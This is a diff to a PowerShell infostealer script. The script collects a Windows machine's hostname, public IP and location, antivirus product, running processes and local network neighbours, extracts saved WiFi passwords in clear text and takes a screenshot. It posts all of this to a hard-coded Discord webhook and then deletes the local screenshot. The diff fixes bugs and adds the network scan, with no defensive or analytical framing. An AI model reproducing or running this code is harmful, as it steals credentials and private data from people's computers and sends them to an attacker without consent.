@@ -1,5 +1,5 @@
 # --- CONFIGURATION ---
-$WEBHOOK = "[https://discord.com/api/webhooks/1481790664013512774/aFcyihxEknHXmDUtZIOH36pmZQrcBhAbYbH3d8uAHuwpDKOjD7NEtKiS_Wy6FuUTK0dY](https://discord.com/api/webhooks/1481790664013512774/aFcyihxEknHXmDUtZIOH36pmZQrcBhAbYbH3d8uAHuwpDKOjD7NEtKiS_Wy6FuUTK0dY)"
+$WEBHOOK = "https://discord.com/api/webhooks/1481790664013512774/aFcyihxEknHXmDUtZIOH36pmZQrcBhAbYbH3d8uAHuwpDKOjD7NEtKiS_Wy6FuUTK0dY"
 $SCREENSHOT_PATH = "$env:TEMP\sys_log.png"
 
 # --- DATA GATHERING ---
@@ -8,7 +8,7 @@ $PC = $env:COMPUTERNAME
 try { 
     $IPInfo = Invoke-RestMethod ipinfo.io/json 
     $PublicIP = $IPInfo.ip
-    $City = $IPInfo.city # Fixed from $IPInfo.ip
+    $City = $IPInfo.city
     $ISP = $IPInfo.org
 } catch {
     $PublicIP = "N/A"; $City = "N/A"; $ISP = "N/A"
@@ -26,30 +26,35 @@ $AV = (Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProdu
 if (!$AV) { $AV = "None/Unknown" }
 $TopProcs = (Get-Process | Sort-Object CPU -Descending | Select-Object -First 5 -ExpandProperty Name) -join ", "
 
+# Local Network Scan
+$LocalMap = arp -a | Select-String "dynamic" | Select-Object -First 5 | Out-String
+if ([string]::IsNullOrWhiteSpace($LocalMap)) { $LocalMap = "No neighbors found." }
+
 # WiFi Extraction
 $WiFi = netsh wlan show prof | Select-String ':\s+(.+)$' | ForEach-Object {
     $name = $_.Matches.Groups[1].Value.Trim()
     $pass = netsh wlan show prof name="$name" key=clear | Select-String 'Key Content\s+:\s+(.+)$' | ForEach-Object { $_.Matches.Groups[1].Value }
     if($pass){ "[$name] : $pass" }
 } | Out-String
-if (!$WiFi) { $WiFi = "No saved profiles" }
+if ([string]::IsNullOrWhiteSpace($WiFi)) { $WiFi = "No saved profiles." }
 
 # --- SCREENSHOT ---
 try {
     Add-Type -AssemblyName System.Windows.Forms, System.Drawing
-    $S=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds
-    $B=New-Object System.Drawing.Bitmap($S.Width,$S.Height)
-    $G=[System.Drawing.Graphics]::FromImage($B)
+    $S = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+    $B = New-Object System.Drawing.Bitmap($S.Width, $S.Height)
+    $G = [System.Drawing.Graphics]::FromImage($B)
     $G.CopyFromScreen(0,0,0,0,$B.Size)
     $B.Save($SCREENSHOT_PATH, [System.Drawing.Imaging.ImageFormat]::Png)
     $G.Dispose(); $B.Dispose()
 } catch {}
 
-# --- STYLED DISCORD EMBED ---
-# We calculate substrings outside the hash table to prevent parsing errors
+# --- PREPARE DATA FOR DISCORD ---
+# Trim to fit Discord's field limits
 $WiFiCut = if($WiFi.Length -gt 800){$WiFi.Substring(0,800)}else{$WiFi}
 $MapCut = if($LocalMap.Length -gt 500){$LocalMap.Substring(0,500)}else{$LocalMap}
 
+# --- STYLED DISCORD EMBED ---
 $Payload = @{
     embeds = @(@{
         title = "--- NEXUS ELITE SYSTEM REPORT ---"
@@ -62,15 +67,18 @@ $Payload = @{
             @{ name = "Hardware Stats"; value = "CPU: $CPU`nRAM: $RAM`nPower: $BatStatus"; inline = $true }
             @{ name = "Security Status"; value = "AV: **$AV**"; inline = $false }
             @{ name = "Top Processes (CPU)"; value = "``$TopProcs``"; inline = $false }
-            @{ name = "Saved WiFi Networks"; value = "```" + $WiFiCut + "```"; inline = $false }
+            # Using single quotes to prevent backtick escaping
+            @{ name = "Saved WiFi Networks"; value = ('```' + $WiFiCut + '```'); inline = $false }
+            @{ name = "Local Network Neighbors"; value = ('```' + $MapCut + '```'); inline = $false }
         )
     })
 }
 
-$Json = $Payload | ConvertTo-Json -Depth 10 # Increased depth for complex objects
+# --- SEND TO DISCORD ---
+$Json = $Payload | ConvertTo-Json -Depth 10
 Invoke-RestMethod -Uri $WEBHOOK -Method Post -Body $Json -ContentType 'application/json'
 
-# File Upload
+# File Upload (Screenshot)
 if (Test-Path $SCREENSHOT_PATH) {
     curl.exe -F "file=@$SCREENSHOT_PATH" $WEBHOOK
     Remove-Item $SCREENSHOT_PATH
